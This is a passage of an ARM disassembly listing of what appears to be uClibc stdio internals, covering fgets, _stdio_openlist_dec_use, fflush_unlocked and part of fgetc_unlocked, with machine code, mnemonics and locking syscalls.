   1be78:	e587303c 	str	r3, [r7, #60]	; 0x3c
   1be7c:	e1a0000a 	mov	r0, sl
   1be80:	e1a01009 	mov	r1, r9
   1be84:	e1a02007 	mov	r2, r7
   1be88:	eb000204 	bl	1c6a0 <__GI_fgets_unlocked>
   1be8c:	e3560000 	cmp	r6, #0
   1be90:	e1a08000 	mov	r8, r0
   1be94:	1a00001c 	bne	1bf0c <__GI_fgets+0x110>
   1be98:	e597303c 	ldr	r3, [r7, #60]	; 0x3c
   1be9c:	e2433001 	sub	r3, r3, #1
   1bea0:	e3530000 	cmp	r3, #0
   1bea4:	e587303c 	str	r3, [r7, #60]	; 0x3c
   1bea8:	1a000017 	bne	1bf0c <__GI_fgets+0x110>
   1beac:	e5873040 	str	r3, [r7, #64]	; 0x40
   1beb0:	e2875038 	add	r5, r7, #56	; 0x38
   1beb4:	e5974038 	ldr	r4, [r7, #56]	; 0x38
   1beb8:	e3a01000 	mov	r1, #0
   1bebc:	e1a02005 	mov	r2, r5
   1bec0:	e5923000 	ldr	r3, [r2]
   1bec4:	e1530004 	cmp	r3, r4
   1bec8:	1a000005 	bne	1bee4 <__GI_fgets+0xe8>
   1becc:	e1a00004 	mov	r0, r4
   1bed0:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bed4:	e1a0e00f 	mov	lr, pc
   1bed8:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bedc:	3afffff7 	bcc	1bec0 <__GI_fgets+0xc4>
   1bee0:	e1a03004 	mov	r3, r4
   1bee4:	e1530004 	cmp	r3, r4
   1bee8:	1afffff1 	bne	1beb4 <__GI_fgets+0xb8>
   1beec:	e3530001 	cmp	r3, #1
   1bef0:	da000005 	ble	1bf0c <__GI_fgets+0x110>
   1bef4:	e2870038 	add	r0, r7, #56	; 0x38
   1bef8:	e2811081 	add	r1, r1, #129	; 0x81
   1befc:	e3a02001 	mov	r2, #1
   1bf00:	e3a03000 	mov	r3, #0
   1bf04:	e3a070f0 	mov	r7, #240	; 0xf0
   1bf08:	ef000000 	svc	0x00000000
   1bf0c:	e1a00008 	mov	r0, r8
   1bf10:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   1bf14:	e12fff1e 	bx	lr

0001bf18 <_stdio_openlist_dec_use>:
   1bf18:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   1bf1c:	e59f5288 	ldr	r5, [pc, #648]	; 1c1ac <_stdio_openlist_dec_use+0x294>
   1bf20:	e59f3288 	ldr	r3, [pc, #648]	; 1c1b0 <_stdio_openlist_dec_use+0x298>
   1bf24:	e08f5005 	add	r5, pc, r5
   1bf28:	e7957003 	ldr	r7, [r5, r3]
   1bf2c:	ebfffa4f 	bl	1a870 <__aeabi_read_tp>
   1bf30:	e5973008 	ldr	r3, [r7, #8]
   1bf34:	e2406e49 	sub	r6, r0, #1168	; 0x490
   1bf38:	e1530006 	cmp	r3, r6
   1bf3c:	e24dd004 	sub	sp, sp, #4
   1bf40:	0a00000f 	beq	1bf84 <_stdio_openlist_dec_use+0x6c>
   1bf44:	e3a01001 	mov	r1, #1
   1bf48:	e1a02007 	mov	r2, r7
   1bf4c:	e3a04000 	mov	r4, #0
   1bf50:	e5923000 	ldr	r3, [r2]
   1bf54:	e1530004 	cmp	r3, r4
   1bf58:	1a000005 	bne	1bf74 <_stdio_openlist_dec_use+0x5c>
   1bf5c:	e1a00004 	mov	r0, r4
   1bf60:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bf64:	e1a0e00f 	mov	lr, pc
   1bf68:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bf6c:	3afffff7 	bcc	1bf50 <_stdio_openlist_dec_use+0x38>
   1bf70:	e1a03004 	mov	r3, r4
   1bf74:	e1530004 	cmp	r3, r4
   1bf78:	11a00007 	movne	r0, r7
   1bf7c:	1bfff6e6 	blne	19b1c <__lll_lock_wait_private>
   1bf80:	e5876008 	str	r6, [r7, #8]
   1bf84:	e59f3224 	ldr	r3, [pc, #548]	; 1c1b0 <_stdio_openlist_dec_use+0x298>
   1bf88:	e7952003 	ldr	r2, [r5, r3]
   1bf8c:	e59f3220 	ldr	r3, [pc, #544]	; 1c1b4 <_stdio_openlist_dec_use+0x29c>
   1bf90:	e7953003 	ldr	r3, [r5, r3]
   1bf94:	e5931000 	ldr	r1, [r3]
   1bf98:	e5923004 	ldr	r3, [r2, #4]
   1bf9c:	e3510001 	cmp	r1, #1
   1bfa0:	e2833001 	add	r3, r3, #1
   1bfa4:	e5823004 	str	r3, [r2, #4]
   1bfa8:	1a000058 	bne	1c110 <_stdio_openlist_dec_use+0x1f8>
   1bfac:	e59f3204 	ldr	r3, [pc, #516]	; 1c1b8 <_stdio_openlist_dec_use+0x2a0>
   1bfb0:	e7953003 	ldr	r3, [r5, r3]
   1bfb4:	e5933000 	ldr	r3, [r3]
   1bfb8:	e3530000 	cmp	r3, #0
   1bfbc:	da000053 	ble	1c110 <_stdio_openlist_dec_use+0x1f8>
   1bfc0:	e59f31f4 	ldr	r3, [pc, #500]	; 1c1bc <_stdio_openlist_dec_use+0x2a4>
   1bfc4:	e7957003 	ldr	r7, [r5, r3]
   1bfc8:	e5973008 	ldr	r3, [r7, #8]
   1bfcc:	e1530006 	cmp	r3, r6
   1bfd0:	0a00000e 	beq	1c010 <_stdio_openlist_dec_use+0xf8>
   1bfd4:	e1a02007 	mov	r2, r7
   1bfd8:	e3a04000 	mov	r4, #0
   1bfdc:	e5923000 	ldr	r3, [r2]
   1bfe0:	e1530004 	cmp	r3, r4
   1bfe4:	1a000005 	bne	1c000 <_stdio_openlist_dec_use+0xe8>
   1bfe8:	e1a00004 	mov	r0, r4
   1bfec:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bff0:	e1a0e00f 	mov	lr, pc
   1bff4:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bff8:	3afffff7 	bcc	1bfdc <_stdio_openlist_dec_use+0xc4>
   1bffc:	e1a03004 	mov	r3, r4
   1c000:	e1530004 	cmp	r3, r4
   1c004:	11a00007 	movne	r0, r7
   1c008:	1bfff6c3 	blne	19b1c <__lll_lock_wait_private>
   1c00c:	e5876008 	str	r6, [r7, #8]
   1c010:	e59f31a4 	ldr	r3, [pc, #420]	; 1c1bc <_stdio_openlist_dec_use+0x2a4>
   1c014:	e59f11a4 	ldr	r1, [pc, #420]	; 1c1c0 <_stdio_openlist_dec_use+0x2a8>
   1c018:	e7950003 	ldr	r0, [r5, r3]
   1c01c:	e7952001 	ldr	r2, [r5, r1]
   1c020:	e5903004 	ldr	r3, [r0, #4]
   1c024:	e5922000 	ldr	r2, [r2]
   1c028:	e2833001 	add	r3, r3, #1
   1c02c:	e1a07001 	mov	r7, r1
   1c030:	e3a06000 	mov	r6, #0
   1c034:	e5803004 	str	r3, [r0, #4]
   1c038:	ea00000e 	b	1c078 <_stdio_openlist_dec_use+0x160>
   1c03c:	e1d230b0 	ldrh	r3, [r2]
   1c040:	e0031001 	and	r1, r3, r1
   1c044:	e3510030 	cmp	r1, #48	; 0x30
   1c048:	e5924020 	ldr	r4, [r2, #32]
   1c04c:	11a06002 	movne	r6, r2
   1c050:	1a000007 	bne	1c074 <_stdio_openlist_dec_use+0x15c>
   1c054:	e3560000 	cmp	r6, #0
   1c058:	07953007 	ldreq	r3, [r5, r7]
   1c05c:	05834000 	streq	r4, [r3]
   1c060:	e1d230b0 	ldrh	r3, [r2]
   1c064:	15864020 	strne	r4, [r6, #32]
   1c068:	e3130a02 	tst	r3, #8192	; 0x2000
   1c06c:	11a00002 	movne	r0, r2
   1c070:	1bfff0b2 	blne	18340 <free>
   1c074:	e1a02004 	mov	r2, r4
   1c078:	e3520000 	cmp	r2, #0
   1c07c:	e59f1140 	ldr	r1, [pc, #320]	; 1c1c4 <_stdio_openlist_dec_use+0x2ac>
   1c080:	1affffed 	bne	1c03c <_stdio_openlist_dec_use+0x124>
   1c084:	e59f3130 	ldr	r3, [pc, #304]	; 1c1bc <_stdio_openlist_dec_use+0x2a4>
   1c088:	e7950003 	ldr	r0, [r5, r3]
   1c08c:	e5903004 	ldr	r3, [r0, #4]
   1c090:	e2433001 	sub	r3, r3, #1
   1c094:	e3530000 	cmp	r3, #0
   1c098:	e5803004 	str	r3, [r0, #4]
   1c09c:	1a000017 	bne	1c100 <_stdio_openlist_dec_use+0x1e8>
   1c0a0:	e5803008 	str	r3, [r0, #8]
   1c0a4:	e1a07000 	mov	r7, r0
   1c0a8:	e5974000 	ldr	r4, [r7]
   1c0ac:	e3a01000 	mov	r1, #0
   1c0b0:	e1a02007 	mov	r2, r7
   1c0b4:	e5923000 	ldr	r3, [r2]
   1c0b8:	e1530004 	cmp	r3, r4
   1c0bc:	1a000005 	bne	1c0d8 <_stdio_openlist_dec_use+0x1c0>
   1c0c0:	e1a00004 	mov	r0, r4
   1c0c4:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c0c8:	e1a0e00f 	mov	lr, pc
   1c0cc:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c0d0:	3afffff7 	bcc	1c0b4 <_stdio_openlist_dec_use+0x19c>
   1c0d4:	e1a03004 	mov	r3, r4
   1c0d8:	e1530004 	cmp	r3, r4
   1c0dc:	1afffff1 	bne	1c0a8 <_stdio_openlist_dec_use+0x190>
   1c0e0:	e3530001 	cmp	r3, #1
   1c0e4:	da000005 	ble	1c100 <_stdio_openlist_dec_use+0x1e8>
   1c0e8:	e1a00007 	mov	r0, r7
   1c0ec:	e2811081 	add	r1, r1, #129	; 0x81
   1c0f0:	e3a02001 	mov	r2, #1
   1c0f4:	e3a03000 	mov	r3, #0
   1c0f8:	e3a070f0 	mov	r7, #240	; 0xf0
   1c0fc:	ef000000 	svc	0x00000000
   1c100:	e59f30b0 	ldr	r3, [pc, #176]	; 1c1b8 <_stdio_openlist_dec_use+0x2a0>
   1c104:	e7952003 	ldr	r2, [r5, r3]
   1c108:	e3a03000 	mov	r3, #0
   1c10c:	e5823000 	str	r3, [r2]
   1c110:	e59f3098 	ldr	r3, [pc, #152]	; 1c1b0 <_stdio_openlist_dec_use+0x298>
   1c114:	e7950003 	ldr	r0, [r5, r3]
   1c118:	e59f3094 	ldr	r3, [pc, #148]	; 1c1b4 <_stdio_openlist_dec_use+0x29c>
   1c11c:	e7951003 	ldr	r1, [r5, r3]
   1c120:	e5902004 	ldr	r2, [r0, #4]
   1c124:	e5913000 	ldr	r3, [r1]
   1c128:	e2422001 	sub	r2, r2, #1
   1c12c:	e2433001 	sub	r3, r3, #1
   1c130:	e3520000 	cmp	r2, #0
   1c134:	e5813000 	str	r3, [r1]
   1c138:	e5802004 	str	r2, [r0, #4]
   1c13c:	1a000017 	bne	1c1a0 <_stdio_openlist_dec_use+0x288>
   1c140:	e5802008 	str	r2, [r0, #8]
   1c144:	e1a07000 	mov	r7, r0
   1c148:	e5974000 	ldr	r4, [r7]
   1c14c:	e3a01000 	mov	r1, #0
   1c150:	e1a02007 	mov	r2, r7
   1c154:	e5923000 	ldr	r3, [r2]
   1c158:	e1530004 	cmp	r3, r4
   1c15c:	1a000005 	bne	1c178 <_stdio_openlist_dec_use+0x260>
   1c160:	e1a00004 	mov	r0, r4
   1c164:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c168:	e1a0e00f 	mov	lr, pc
   1c16c:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c170:	3afffff7 	bcc	1c154 <_stdio_openlist_dec_use+0x23c>
   1c174:	e1a03004 	mov	r3, r4
   1c178:	e1530004 	cmp	r3, r4
   1c17c:	1afffff1 	bne	1c148 <_stdio_openlist_dec_use+0x230>
   1c180:	e3530001 	cmp	r3, #1
   1c184:	da000005 	ble	1c1a0 <_stdio_openlist_dec_use+0x288>
   1c188:	e1a00007 	mov	r0, r7
   1c18c:	e2811081 	add	r1, r1, #129	; 0x81
   1c190:	e3a02001 	mov	r2, #1
   1c194:	e3a03000 	mov	r3, #0
   1c198:	e3a070f0 	mov	r7, #240	; 0xf0
   1c19c:	ef000000 	svc	0x00000000
   1c1a0:	e28dd004 	add	sp, sp, #4
   1c1a4:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   1c1a8:	e12fff1e 	bx	lr
   1c1ac:	0000ca68 	.word	0x0000ca68
   1c1b0:	000000a0 	.word	0x000000a0
   1c1b4:	0000000c 	.word	0x0000000c
   1c1b8:	00000050 	.word	0x00000050
   1c1bc:	00000098 	.word	0x00000098
   1c1c0:	0000004c 	.word	0x0000004c
   1c1c4:	00008030 	.word	0x00008030

0001c1c8 <__GI_fflush_unlocked>:
   1c1c8:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1c1cc:	e59f6388 	ldr	r6, [pc, #904]	; 1c55c <__GI_fflush_unlocked+0x394>
   1c1d0:	e59f3388 	ldr	r3, [pc, #904]	; 1c560 <__GI_fflush_unlocked+0x398>
   1c1d4:	e08f6006 	add	r6, pc, r6
   1c1d8:	e7963003 	ldr	r3, [r6, r3]
   1c1dc:	e1500003 	cmp	r0, r3
   1c1e0:	e24dd00c 	sub	sp, sp, #12
   1c1e4:	03a02000 	moveq	r2, #0
   1c1e8:	e1a04000 	mov	r4, r0
   1c1ec:	058d2004 	streq	r2, [sp, #4]
   1c1f0:	0a000003 	beq	1c204 <__GI_fflush_unlocked+0x3c>
   1c1f4:	e3a03c01 	mov	r3, #256	; 0x100
   1c1f8:	e3500000 	cmp	r0, #0
   1c1fc:	e58d3004 	str	r3, [sp, #4]
   1c200:	1a0000c4 	bne	1c518 <__GI_fflush_unlocked+0x350>
   1c204:	e59f3358 	ldr	r3, [pc, #856]	; 1c564 <__GI_fflush_unlocked+0x39c>
   1c208:	e7965003 	ldr	r5, [r6, r3]
   1c20c:	ebfff997 	bl	1a870 <__aeabi_read_tp>
   1c210:	e5953008 	ldr	r3, [r5, #8]
   1c214:	e2408e49 	sub	r8, r0, #1168	; 0x490
   1c218:	e1530008 	cmp	r3, r8
   1c21c:	0a00000f 	beq	1c260 <__GI_fflush_unlocked+0x98>
   1c220:	e3a01001 	mov	r1, #1
   1c224:	e1a02005 	mov	r2, r5
   1c228:	e3a04000 	mov	r4, #0
   1c22c:	e5923000 	ldr	r3, [r2]
   1c230:	e1530004 	cmp	r3, r4
   1c234:	1a000005 	bne	1c250 <__GI_fflush_unlocked+0x88>
   1c238:	e1a00004 	mov	r0, r4
   1c23c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c240:	e1a0e00f 	mov	lr, pc
   1c244:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c248:	3afffff7 	bcc	1c22c <__GI_fflush_unlocked+0x64>
   1c24c:	e1a03004 	mov	r3, r4
   1c250:	e1530004 	cmp	r3, r4
   1c254:	11a00005 	movne	r0, r5
   1c258:	1bfff62f 	blne	19b1c <__lll_lock_wait_private>
   1c25c:	e5858008 	str	r8, [r5, #8]
   1c260:	e59f32fc 	ldr	r3, [pc, #764]	; 1c564 <__GI_fflush_unlocked+0x39c>
   1c264:	e7960003 	ldr	r0, [r6, r3]
   1c268:	e59f32f8 	ldr	r3, [pc, #760]	; 1c568 <__GI_fflush_unlocked+0x3a0>
   1c26c:	e7962003 	ldr	r2, [r6, r3]
   1c270:	e5901004 	ldr	r1, [r0, #4]
   1c274:	e5923000 	ldr	r3, [r2]
   1c278:	e3510000 	cmp	r1, #0
   1c27c:	e2833001 	add	r3, r3, #1
   1c280:	e5823000 	str	r3, [r2]
   1c284:	1a000017 	bne	1c2e8 <__GI_fflush_unlocked+0x120>
   1c288:	e5801008 	str	r1, [r0, #8]
   1c28c:	e1a05000 	mov	r5, r0
   1c290:	e5954000 	ldr	r4, [r5]
   1c294:	e3a01000 	mov	r1, #0
   1c298:	e1a02005 	mov	r2, r5
   1c29c:	e5923000 	ldr	r3, [r2]
   1c2a0:	e1530004 	cmp	r3, r4
   1c2a4:	1a000005 	bne	1c2c0 <__GI_fflush_unlocked+0xf8>
   1c2a8:	e1a00004 	mov	r0, r4
   1c2ac:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c2b0:	e1a0e00f 	mov	lr, pc
   1c2b4:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c2b8:	3afffff7 	bcc	1c29c <__GI_fflush_unlocked+0xd4>
   1c2bc:	e1a03004 	mov	r3, r4
   1c2c0:	e1530004 	cmp	r3, r4
   1c2c4:	1afffff1 	bne	1c290 <__GI_fflush_unlocked+0xc8>
   1c2c8:	e3530001 	cmp	r3, #1
   1c2cc:	da000005 	ble	1c2e8 <__GI_fflush_unlocked+0x120>
   1c2d0:	e1a00005 	mov	r0, r5
   1c2d4:	e2811081 	add	r1, r1, #129	; 0x81
   1c2d8:	e3a02001 	mov	r2, #1
   1c2dc:	e3a03000 	mov	r3, #0
   1c2e0:	e3a070f0 	mov	r7, #240	; 0xf0
   1c2e4:	ef000000 	svc	0x00000000
   1c2e8:	e59f327c 	ldr	r3, [pc, #636]	; 1c56c <__GI_fflush_unlocked+0x3a4>
   1c2ec:	e7965003 	ldr	r5, [r6, r3]
   1c2f0:	e5953008 	ldr	r3, [r5, #8]
   1c2f4:	e1530008 	cmp	r3, r8
   1c2f8:	0a00000f 	beq	1c33c <__GI_fflush_unlocked+0x174>
   1c2fc:	e3a01001 	mov	r1, #1
   1c300:	e1a02005 	mov	r2, r5
   1c304:	e3a04000 	mov	r4, #0
   1c308:	e5923000 	ldr	r3, [r2]
   1c30c:	e1530004 	cmp	r3, r4
   1c310:	1a000005 	bne	1c32c <__GI_fflush_unlocked+0x164>
   1c314:	e1a00004 	mov	r0, r4
   1c318:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c31c:	e1a0e00f 	mov	lr, pc
   1c320:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c324:	3afffff7 	bcc	1c308 <__GI_fflush_unlocked+0x140>
   1c328:	e1a03004 	mov	r3, r4
   1c32c:	e1530004 	cmp	r3, r4
   1c330:	11a00005 	movne	r0, r5
   1c334:	1bfff5f8 	blne	19b1c <__lll_lock_wait_private>
   1c338:	e5858008 	str	r8, [r5, #8]
   1c33c:	e59f3228 	ldr	r3, [pc, #552]	; 1c56c <__GI_fflush_unlocked+0x3a4>
   1c340:	e7960003 	ldr	r0, [r6, r3]
   1c344:	e59f3214 	ldr	r3, [pc, #532]	; 1c560 <__GI_fflush_unlocked+0x398>
   1c348:	e5901004 	ldr	r1, [r0, #4]
   1c34c:	e7963003 	ldr	r3, [r6, r3]
   1c350:	e3510000 	cmp	r1, #0
   1c354:	e5935000 	ldr	r5, [r3]
   1c358:	1a000017 	bne	1c3bc <__GI_fflush_unlocked+0x1f4>
   1c35c:	e5801008 	str	r1, [r0, #8]
   1c360:	e1a07000 	mov	r7, r0
   1c364:	e5974000 	ldr	r4, [r7]
   1c368:	e3a01000 	mov	r1, #0
   1c36c:	e1a02007 	mov	r2, r7
   1c370:	e5923000 	ldr	r3, [r2]
   1c374:	e1530004 	cmp	r3, r4
   1c378:	1a000005 	bne	1c394 <__GI_fflush_unlocked+0x1cc>
   1c37c:	e1a00004 	mov	r0, r4
   1c380:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c384:	e1a0e00f 	mov	lr, pc
   1c388:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c38c:	3afffff7 	bcc	1c370 <__GI_fflush_unlocked+0x1a8>
   1c390:	e1a03004 	mov	r3, r4
   1c394:	e1530004 	cmp	r3, r4
   1c398:	1afffff1 	bne	1c364 <__GI_fflush_unlocked+0x19c>
   1c39c:	e3530001 	cmp	r3, #1
   1c3a0:	da000005 	ble	1c3bc <__GI_fflush_unlocked+0x1f4>
   1c3a4:	e1a00007 	mov	r0, r7
   1c3a8:	e2811081 	add	r1, r1, #129	; 0x81
   1c3ac:	e3a02001 	mov	r2, #1
   1c3b0:	e3a03000 	mov	r3, #0
   1c3b4:	e3a070f0 	mov	r7, #240	; 0xf0
   1c3b8:	ef000000 	svc	0x00000000
   1c3bc:	e59f91ac 	ldr	r9, [pc, #428]	; 1c570 <__GI_fflush_unlocked+0x3a8>
   1c3c0:	e3a0a000 	mov	sl, #0
   1c3c4:	e3e0b000 	mvn	fp, #0
   1c3c8:	ea00004e 	b	1c508 <__GI_fflush_unlocked+0x340>
   1c3cc:	e1d530b0 	ldrh	r3, [r5]
   1c3d0:	e3130040 	tst	r3, #64	; 0x40
   1c3d4:	0a00004a 	beq	1c504 <__GI_fflush_unlocked+0x33c>
   1c3d8:	e7963009 	ldr	r3, [r6, r9]
   1c3dc:	e5933000 	ldr	r3, [r3]
   1c3e0:	e3530002 	cmp	r3, #2
   1c3e4:	0a000016 	beq	1c444 <__GI_fflush_unlocked+0x27c>
   1c3e8:	e5953040 	ldr	r3, [r5, #64]	; 0x40
   1c3ec:	e1530008 	cmp	r3, r8
   1c3f0:	0a000010 	beq	1c438 <__GI_fflush_unlocked+0x270>
   1c3f4:	e2857038 	add	r7, r5, #56	; 0x38
   1c3f8:	e3a01001 	mov	r1, #1
   1c3fc:	e1a02007 	mov	r2, r7
   1c400:	e3a04000 	mov	r4, #0
   1c404:	e5923000 	ldr	r3, [r2]
   1c408:	e1530004 	cmp	r3, r4
   1c40c:	1a000005 	bne	1c428 <__GI_fflush_unlocked+0x260>
   1c410:	e1a00004 	mov	r0, r4
   1c414:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c418:	e1a0e00f 	mov	lr, pc
   1c41c:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c420:	3afffff7 	bcc	1c404 <__GI_fflush_unlocked+0x23c>
   1c424:	e1a03004 	mov	r3, r4
   1c428:	e1530004 	cmp	r3, r4
   1c42c:	11a00007 	movne	r0, r7
   1c430:	1bfff5b9 	blne	19b1c <__lll_lock_wait_private>
   1c434:	e5858040 	str	r8, [r5, #64]	; 0x40
   1c438:	e595303c 	ldr	r3, [r5, #60]	; 0x3c
   1c43c:	e2833001 	add	r3, r3, #1
   1c440:	e585303c 	str	r3, [r5, #60]	; 0x3c
   1c444:	e1d530b0 	ldrh	r3, [r5]
   1c448:	e59d2004 	ldr	r2, [sp, #4]
   1c44c:	e1823003 	orr	r3, r2, r3
   1c450:	e2233d05 	eor	r3, r3, #320	; 0x140
   1c454:	e3130d0d 	tst	r3, #832	; 0x340
   1c458:	1a000008 	bne	1c480 <__GI_fflush_unlocked+0x2b8>
   1c45c:	e1a00005 	mov	r0, r5
   1c460:	ebfffe08 	bl	1bc88 <__stdio_wcommit>
   1c464:	e3500000 	cmp	r0, #0
   1c468:	01d530b0 	ldrheq	r3, [r5]
   1c46c:	05952008 	ldreq	r2, [r5, #8]
   1c470:	03c33040 	biceq	r3, r3, #64	; 0x40
   1c474:	0585201c 	streq	r2, [r5, #28]
   1c478:	01c530b0 	strheq	r3, [r5]
   1c47c:	11a0a00b 	movne	sl, fp
   1c480:	e7963009 	ldr	r3, [r6, r9]
   1c484:	e5933000 	ldr	r3, [r3]
   1c488:	e3530002 	cmp	r3, #2
   1c48c:	0a00001c 	beq	1c504 <__GI_fflush_unlocked+0x33c>
   1c490:	e595303c 	ldr	r3, [r5, #60]	; 0x3c
   1c494:	e2433001 	sub	r3, r3, #1
   1c498:	e3530000 	cmp	r3, #0
   1c49c:	e585303c 	str	r3, [r5, #60]	; 0x3c
   1c4a0:	1a000017 	bne	1c504 <__GI_fflush_unlocked+0x33c>
   1c4a4:	e5853040 	str	r3, [r5, #64]	; 0x40
   1c4a8:	e2857038 	add	r7, r5, #56	; 0x38
   1c4ac:	e5954038 	ldr	r4, [r5, #56]	; 0x38
   1c4b0:	e3a01000 	mov	r1, #0
   1c4b4:	e1a02007 	mov	r2, r7
   1c4b8:	e5923000 	ldr	r3, [r2]
   1c4bc:	e1530004 	cmp	r3, r4
   1c4c0:	1a000005 	bne	1c4dc <__GI_fflush_unlocked+0x314>
   1c4c4:	e1a00004 	mov	r0, r4
   1c4c8:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1c4cc:	e1a0e00f 	mov	lr, pc
   1c4d0:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1c4d4:	3afffff7 	bcc	1c4b8 <__GI_fflush_unlocked+0x2f0>
   1c4d8:	e1a03004 	mov	r3, r4
   1c4dc:	e1530004 	cmp	r3, r4
   1c4e0:	1afffff1 	bne	1c4ac <__GI_fflush_unlocked+0x2e4>
   1c4e4:	e3530001 	cmp	r3, #1
   1c4e8:	da000005 	ble	1c504 <__GI_fflush_unlocked+0x33c>
   1c4ec:	e2850038 	add	r0, r5, #56	; 0x38
   1c4f0:	e2811081 	add	r1, r1, #129	; 0x81
   1c4f4:	e3a02001 	mov	r2, #1
   1c4f8:	e3a03000 	mov	r3, #0
   1c4fc:	e3a070f0 	mov	r7, #240	; 0xf0
   1c500:	ef000000 	svc	0x00000000
   1c504:	e5955020 	ldr	r5, [r5, #32]
   1c508:	e3550000 	cmp	r5, #0
   1c50c:	1affffae 	bne	1c3cc <__GI_fflush_unlocked+0x204>
   1c510:	ebfffe80 	bl	1bf18 <_stdio_openlist_dec_use>
   1c514:	ea00000c 	b	1c54c <__GI_fflush_unlocked+0x384>
   1c518:	e1d030b0 	ldrh	r3, [r0]
   1c51c:	e2133040 	ands	r3, r3, #64	; 0x40
   1c520:	01a0a003 	moveq	sl, r3
   1c524:	0a000008 	beq	1c54c <__GI_fflush_unlocked+0x384>
   1c528:	ebfffdd6 	bl	1bc88 <__stdio_wcommit>
   1c52c:	e3500000 	cmp	r0, #0
   1c530:	01d430b0 	ldrheq	r3, [r4]
   1c534:	05942008 	ldreq	r2, [r4, #8]
   1c538:	03c33040 	biceq	r3, r3, #64	; 0x40
   1c53c:	01c430b0 	strheq	r3, [r4]
   1c540:	0584201c 	streq	r2, [r4, #28]
   1c544:	13e0a000 	mvnne	sl, #0
   1c548:	01a0a000 	moveq	sl, r0
   1c54c:	e1a0000a 	mov	r0, sl
   1c550:	e28dd00c 	add	sp, sp, #12
   1c554:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1c558:	e12fff1e 	bx	lr
   1c55c:	0000c7b8 	.word	0x0000c7b8
   1c560:	0000004c 	.word	0x0000004c
   1c564:	000000a0 	.word	0x000000a0
   1c568:	0000000c 	.word	0x0000000c
   1c56c:	00000098 	.word	0x00000098
   1c570:	0000005c 	.word	0x0000005c

0001c574 <__GI___fgetc_unlocked>:
   1c574:	e92d4030 	push	{r4, r5, lr}
   1c578:	e5902010 	ldr	r2, [r0, #16]
   1c57c:	e5903018 	ldr	r3, [r0, #24]
   1c580:	e1520003 	cmp	r2, r3
   1c584:	e1a04000 	mov	r4, r0
   1c588:	e59f5108 	ldr	r5, [pc, #264]	; 1c698 <__GI___fgetc_unlocked+0x124>
   1c58c:	34d20001 	ldrbcc	r0, [r2], #1
   1c590:	e08f5005 	add	r5, pc, r5
   1c594:	e24dd00c 	sub	sp, sp, #12
   1c598:	35842010 	strcc	r2, [r4, #16]
   1c59c:	3a00003a 	bcc	1c68c <__GI___fgetc_unlocked+0x118>
   1c5a0:	e1d430b0 	ldrh	r3, [r4]
   1c5a4:	e2033083 	and	r3, r3, #131	; 0x83
   1c5a8:	e3530080 	cmp	r3, #128	; 0x80
   1c5ac:	8a000003 	bhi	1c5c0 <__GI___fgetc_unlocked+0x4c>
   1c5b0:	e3a01080 	mov	r1, #128	; 0x80
   1c5b4:	eb000488 	bl	1d7dc <__stdio_trans2r_o>
   1c5b8:	e3500000 	cmp	r0, #0
   1c5bc:	1a000031 	bne	1c688 <__GI___fgetc_unlocked+0x114>
   1c5c0:	e1d420b0 	ldrh	r2, [r4]
   1c5c4:	e3120002 	tst	r2, #2
   1c5c8:	0a000008 	beq	1c5f0 <__GI___fgetc_unlocked+0x7c>
   1c5cc:	e2023001 	and	r3, r2, #1
   1c5d0:	e0843103 	add	r3, r4, r3, lsl #2
   1c5d4:	e5d33024 	ldrb	r3, [r3, #36]	; 0x24
   1c5d8:	e2422001 	sub	r2, r2, #1
   1c5dc:	e1a00003 	mov	r0, r3
   1c5e0:	e3a03000 	mov	r3, #0
   1c5e4:	e5843028 	str	r3, [r4, #40]	; 0x28
   1c5e8:	e1c420b0 	strh	r2, [r4]
   1c5ec:	ea000026 	b	1c68c <__GI___fgetc_unlocked+0x118>
   1c5f0:	e2841010 	add	r1, r4, #16
   1c5f4:	e891000a 	ldm	r1, {r1, r3}
   1c5f8:	e1530001 	cmp	r3, r1
   1c5fc:	14d10001 	ldrbne	r0, [r1], #1
   1c600:	15841010 	strne	r1, [r4, #16]
   1c604:	1a000020 	bne	1c68c <__GI___fgetc_unlocked+0x118>
   1c608:	e5943004 	ldr	r3, [r4, #4]
   1c60c:	e3730002 	cmn	r3, #2
   1c610:	03823004 	orreq	r3, r2, #4
   1c614:	03e00000 	mvneq	r0, #0
   1c618:	01c430b0 	strheq	r3, [r4]
   1c61c:	0a00001a 	beq	1c68c <__GI___fgetc_unlocked+0x118>
   1c620:	e3120c03 	tst	r2, #768	; 0x300
   1c624:	159f3070 	ldrne	r3, [pc, #112]	; 1c69c <__GI___fgetc_unlocked+0x128>
   1c628:	17950003 	ldrne	r0, [r5, r3]
   1c62c:	1bfffee5 	blne	1c1c8 <__GI_fflush_unlocked>
   1c630:	e2842008 	add	r2, r4, #8
   1c634:	e892000c 	ldm	r2, {r2, r3}
   1c638:	e1530002 	cmp	r3, r2
   1c63c:	0a00000a 	beq	1c66c <__GI___fgetc_unlocked+0xf8>
   1c640:	e5842018 	str	r2, [r4, #24]
   1c644:	e1a00004 	mov	r0, r4
   1c648:	eb000457 	bl	1d7ac <__stdio_rfill>
   1c64c:	e3500000 	cmp	r0, #0
